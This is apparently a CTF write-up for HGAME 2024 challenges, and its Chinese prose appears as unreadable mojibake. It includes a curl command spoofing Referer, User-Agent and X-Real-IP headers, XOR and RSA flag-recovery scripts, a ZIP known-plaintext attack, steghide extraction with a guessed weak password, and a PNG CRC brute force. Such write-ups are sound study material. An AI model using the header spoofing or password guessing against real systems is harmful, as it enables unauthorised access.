å…³äº†</p><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;2d2f501efc15bd17039eb7e73f3206dd3d62b19c&#125;</code></font></center></strong></em></p><h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h2><p>ç„å­¦é¢˜ï¼Œç­‰å®˜æ–¹WPâ€¦</p><h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><p>ç»å…¸é¢˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -i http://47.102.130.35:31673 --header &quot;Referer: vidar.club&quot; --header &quot;User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&quot; --header &quot;X-Real-IP: 127.0.0.1&quot;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸² jwt </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc<br></code></pre></td></tr></table></figure><p><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>è§£å¾—</p><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;HTTP_!s_1mP0rT4nt&#125;</code></font></center></strong></em></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .data<br>    c db 74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34<br>    flag db 33 dup(0)<br>    format db &quot;plz input your flag: &quot;, 0<br>    success db &quot;Congratulations!&quot;, 0<br>    failure db &quot;Sry, plz try again&quot;, 0<br><br>section .text<br>    global _start<br><br>_start:<br>    ; Print prompt<br>    mov eax, 4<br>    mov ebx, 1<br>    mov ecx, format<br>    mov edx, 20<br>    int 0x80<br><br>    ; Read user input<br>    mov eax, 3<br>    mov ebx, 0<br>    mov ecx, flag<br>    mov edx, 33<br>    int 0x80<br><br>    ; Check flag<br>    xor esi, esi<br>check_flag:<br>    mov al, byte [flag + esi]<br>    xor al, 0x22<br>    cmp al, byte [c + esi]<br>    jne failure_check<br><br>    inc esi<br>    cmp esi, 33<br>    jne check_flag<br><br>    ; Print success message<br>    mov eax, 4<br>    mov ebx, 1<br>    mov ecx, success<br>    mov edx, 14<br>    int 0x80<br><br>    ; Exit<br>    mov eax, 1<br>    xor ebx, ebx<br>    int 0x80<br><br>failure_check:<br>    ; Print failure message<br>    mov eax, 4<br>    mov ebx, 1<br>    mov ecx, failure<br>    mov edx, 18<br>    int 0x80<br><br>    ; Exit<br>    mov eax, 1<br>    xor ebx, ebx<br>    int 0x80<br><br></code></pre></td></tr></table></figure><p>å®¡è®¡ï¼ˆGPTï¼‰å¾— check_flag ä¸­è¿›è¡Œäº†å¼‚æˆ–</p><p>ä¹Ÿå°±æ˜¯æŠŠ <code>74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34</code> è·Ÿ <code>0x22</code> è¿›è¡Œå¼‚æˆ–å°±å¯ä»¥å¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># åŸå§‹æ•°æ®</span><br>data = [<span class="hljs-number">74</span>, <span class="hljs-number">69</span>, <span class="hljs-number">67</span>, <span class="hljs-number">79</span>, <span class="hljs-number">71</span>, <span class="hljs-number">89</span>, <span class="hljs-number">99</span>, <span class="hljs-number">113</span>, <span class="hljs-number">111</span>, <span class="hljs-number">125</span>, <span class="hljs-number">107</span>, <span class="hljs-number">81</span>, <span class="hljs-number">125</span>, <span class="hljs-number">107</span>, <span class="hljs-number">79</span>, <span class="hljs-number">82</span>, <span class="hljs-number">18</span>, <span class="hljs-number">80</span>, <span class="hljs-number">86</span>, <span class="hljs-number">22</span>, <span class="hljs-number">76</span>, <span class="hljs-number">86</span>, <span class="hljs-number">125</span>, <span class="hljs-number">22</span>, <span class="hljs-number">125</span>, <span class="hljs-number">112</span>, <span class="hljs-number">71</span>, <span class="hljs-number">84</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">81</span>, <span class="hljs-number">17</span>, <span class="hljs-number">95</span>, <span class="hljs-number">34</span>]<br><br><span class="hljs-comment"># å¼‚æˆ–æ“ä½œå¹¶è½¬æ¢ä¸ºå­—ç¬¦</span><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(i ^ <span class="hljs-number">0x22</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data)<br><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;</code></font></center></strong></em></p><h2 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h2><p>ç”¨ <code>pyinstxtractor</code> æŠŠ exe è§£åŒ…æˆ pyc</p><p>ç„¶åç”¨<a href="https://tool.lu/pyc/">pythonåç¼–è¯‘ - åœ¨çº¿å·¥å…· (tool.lu)</a>æˆ–è€… uncompyle6 åç¼–è¯‘å¾—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>flag = [<br>    <span class="hljs-number">87</span>,<br>    <span class="hljs-number">75</span>,<br>    <span class="hljs-number">71</span>,<br>    <span class="hljs-number">69</span>,<br>    <span class="hljs-number">83</span>,<br>    <span class="hljs-number">121</span>,<br>    <span class="hljs-number">83</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">117</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">94</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">94</span>,<br>    <span class="hljs-number">51</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">91</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">115</span>,<br>    <span class="hljs-number">49</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">124</span>,<br>    <span class="hljs-number">2</span>]<br>c = [<br>    <span class="hljs-number">1</span>,<br>    <span class="hljs-number">2</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">4</span>]<br><span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;plz input flag:&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">36</span>, <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">input</span>[i]) ^ c[i % <span class="hljs-number">4</span>] != flag[i]:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Sry, try again...&#x27;</span>)<br>        exit()<br>        <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wow!You know a little of python reverse&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br></code></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯å¼‚æˆ–ï¼Œç¨å¾®æ”¹ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>flag = [<br>    <span class="hljs-number">87</span>,<br>    <span class="hljs-number">75</span>,<br>    <span class="hljs-number">71</span>,<br>    <span class="hljs-number">69</span>,<br>    <span class="hljs-number">83</span>,<br>    <span class="hljs-number">121</span>,<br>    <span class="hljs-number">83</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">117</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">94</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">94</span>,<br>    <span class="hljs-number">51</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">91</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">115</span>,<br>    <span class="hljs-number">49</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">124</span>,<br>    <span class="hljs-number">2</span>,<br>]<br>c = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br><span class="hljs-comment"># input = input(&#x27;plz input flag:&#x27;)</span><br>flagG = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">37</span>, <span class="hljs-number">1</span>):<br>    flagG += <span class="hljs-built_in">chr</span>(flag[i] ^ c[i % <span class="hljs-number">4</span>])<br><br><span class="hljs-built_in">print</span>(flagG)<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>VIDAR&#123;Python_R3vers3_1s_1nter3st1ng!&#125;</code></font></center></strong></em></p><h2 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h2><p>æŠŠæ–‡ä»¶è„±å£³æ”¾å…¥idaå¾—</p><p><img src="/posts/b4162f1f/image-20240205023940415.png" alt="image-20240205023940415"></p><p><img src="/posts/b4162f1f/image-20240205024030914.png" alt="image-20240205024030914"></p><p>ä¹Ÿæ˜¯å¼‚æˆ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">data = (<br>    [<br>        <span class="hljs-number">100</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">118</span>,<br>        <span class="hljs-number">115</span>,<br>        <span class="hljs-number">96</span>,<br>        <span class="hljs-number">73</span>,<br>        <span class="hljs-number">101</span>,<br>        <span class="hljs-number">93</span>,<br>        <span class="hljs-number">69</span>,<br>        <span class="hljs-number">19</span>,<br>        <span class="hljs-number">107</span>,<br>        <span class="hljs-number">2</span>,<br>        <span class="hljs-number">71</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">89</span>,<br>        <span class="hljs-number">92</span>,<br>        <span class="hljs-number">2</span>,<br>        <span class="hljs-number">69</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">6</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">94</span>,<br>        <span class="hljs-number">3</span>,<br>    ]<br>    + [<span class="hljs-number">70</span>, <span class="hljs-number">70</span>]<br>    + [<span class="hljs-number">94</span>, <span class="hljs-number">1</span>, <span class="hljs-number">109</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">109</span>, <span class="hljs-number">103</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">19</span>, <span class="hljs-number">79</span>, <span class="hljs-number">50</span>]<br>    + [<span class="hljs-number">0</span>] * <span class="hljs-number">11</span><br>)<br><br><span class="hljs-comment"># ä¸50è¿›è¡Œå¼‚æˆ–å¹¶è½¬æ¢ä¸ºå­—ç¬¦</span><br>result = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(i ^ <span class="hljs-number">50</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data)<br><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>VIDAR&#123;Wow!Y0u_kn0w_4_l1ttl3_0f_UPX!&#125;</code></font></center></strong></em></p><h2 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h2><p>idaæ‰“å¼€å°±è¡Œ</p><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;W3lc0me_T0_Th3_World_of_Rev3rse!&#125;</code></font></center></strong></em></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m=bytes_to_long(flag)<br>p=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br>n=p*q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">0x10001</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>leak1=<span class="hljs-built_in">pow</span>(p,q,n)<br>leak2=<span class="hljs-built_in">pow</span>(q,p,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;leak1=<span class="hljs-subst">&#123;leak1&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;leak2=<span class="hljs-subst">&#123;leak2&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c=<span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span><br><span class="hljs-string">leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span><br><span class="hljs-string">c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>e = <span class="hljs-number">0x10001</span><br>leak1 = <span class="hljs-number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span><br>leak2 = <span class="hljs-number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span><br>c = <span class="hljs-number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span><br><br><br>phi = (leak1 - <span class="hljs-number">1</span>) * (leak2 - <span class="hljs-number">1</span>)<br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, leak1 * leak2)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;F3rmat_l1tt1e_the0rem_is_th3_bas1s&#125;</code></font></center></strong></em></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Simple-Attack"><a href="#Simple-Attack" class="headerlink" title="Simple Attack"></a>Simple Attack</h2><p>ZIPæ˜æ–‡æ”»å‡»ï¼Œä½¿ç”¨ ARCHPR</p><p><img src="/posts/b4162f1f/image-20240205031619809.png" alt="image-20240205031619809"></p><p>è§£å¯†å¾—åˆ° base64 å›¾ç‰‡</p><p><img src="/posts/b4162f1f/image-20240205031703432.png" alt="image-20240205031703432"></p><h2 id="æ¥è‡ªæ˜Ÿå°˜çš„å‘¼å”¤"><a href="#æ¥è‡ªæ˜Ÿå°˜çš„å‘¼å”¤" class="headerlink" title="æ¥è‡ªæ˜Ÿå°˜çš„å‘¼å”¤"></a>æ¥è‡ªæ˜Ÿå°˜çš„å‘¼å”¤</h2><blockquote><p>ä¸€ä¸ªå³å°†å‘å”®çš„æ¸¸æˆçš„ä¸»è§’è–‡^3å¸¦æ¥äº†ä¸€æ¡æ¶ˆæ¯ã€‚è¿™æ®µæ¶ˆæ¯éšè—åœ¨åŠ å¯†çš„å›¾ç‰‡é‡Œ ä½†å³ä½¿è§£å¼€äº†å›¾ç‰‡çš„å…­ä½å¼±åŠ å¯†,çœ‹åˆ°çš„ä¹Ÿæ˜¯ä¸€å¼ è¿·æƒ‘çš„å›¾ç‰‡ã€‚ ä¹Ÿè®¸æ¸¸æˆçš„å®˜ç½‘ä¸Šæœ‰è¿™ç§æ–‡å­—çš„è®°å½•? è¡¥å……ï¼šflagæ ¼å¼ä¸º<code>hgame\&#123;[a-z0-9_]+\&#125;</code></p></blockquote><p>å¼±å¯†ç çŒœæµ‹123456</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">steghide extract -sf xxx.jpg -p 123456<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å›¾ç‰‡å’Œå‰ç«¯ç½‘é¡µï¼Œçœ‹äº† js ï¼ŒçŒœæµ‹è¦å»æ¸¸æˆå®˜ç½‘ä¸‹è½½å­—ä½“ï¼Œå¾—åˆ°</p><p><img src="/posts/b4162f1f/image-20240205144517869.png" alt="image-20240205144517869"></p><h2 id="å¸Œå„¿å¸Œå„¿å¸Œå„¿"><a href="#å¸Œå„¿å¸Œå„¿å¸Œå„¿" class="headerlink" title="å¸Œå„¿å¸Œå„¿å¸Œå„¿"></a>å¸Œå„¿å¸Œå„¿å¸Œå„¿</h2><blockquote><p>Ch405æ˜¯ä¸€åå¿ å®çš„å¸Œå„¿å¨ï¼Œäºæ˜¯ä»–å‡ºäº†ä¸€é“è¿™æ ·çš„é¢˜ï¼Œä¸è¿‡ä»–ä¼¼ä¹å¿˜äº†è¿™ä¸ªåŠ å¯†çš„åå­—ä¸æ˜¯å¸Œå„¿äº†ï¼ˆxè™½ç„¶ç»å¸¸æœ‰äººå«é”™ è¡¥å……ï¼š å›¾ç‰‡æ‰“ä¸å¼€æ˜¯æ­£å¸¸ç°è±¡,éœ€è¦ä¿®å¤ æœ€ç»ˆå¾—åˆ°çš„å¤§å†™å­—æ¯è¯·ç”¨hgame{}åŒ…è£¹</p></blockquote><p>æ ¹æ®æç¤ºçŒœæµ‹æ˜¯å¸Œå°”åŠ å¯†ï¼Œå›¾ç‰‡éœ€è¦æ ¹æ® crc è¿˜åŸå®½é«˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;secret.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()  <span class="hljs-comment"># æ‰“å¼€å›¾ç‰‡</span><br>crc32frombp = <span class="hljs-built_in">int</span>(crcbp[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>].<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)  <span class="hljs-comment"># è¯»å–å›¾ç‰‡ä¸­çš„CRCæ ¡éªŒå€¼</span><br><span class="hljs-built_in">print</span>(crc32frombp)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):  <span class="hljs-comment"># å®½åº¦1-4000è¿›è¡Œæšä¸¾</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):  <span class="hljs-comment"># é«˜åº¦1-4000è¿›è¡Œæšä¸¾</span><br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + struct.pack(<span class="hljs-string">&quot;&gt;i&quot;</span>, i) + struct.pack(<span class="hljs-string">&quot;&gt;i&quot;</span>, j) + crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-comment"># print(crc32)</span><br>        <span class="hljs-keyword">if</span> (<br>            crc32 == crc32frombp<br>        ):  <span class="hljs-comment"># è®¡ç®—å½“å›¾ç‰‡å¤§å°ä¸ºi:jæ—¶çš„CRCæ ¡éªŒå€¼ï¼Œä¸å›¾ç‰‡ä¸­çš„CRCæ¯”è¾ƒï¼Œå½“ç›¸åŒï¼Œåˆ™å›¾ç‰‡å¤§å°å·²ç»ç¡®å®š</span><br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex:&quot;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br><br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">303792205<br>1394 1999<br>hex: 0x572 0x7cf<br></code></pre></td></tr></table></figure><p>é€šè¿‡ stegsolver 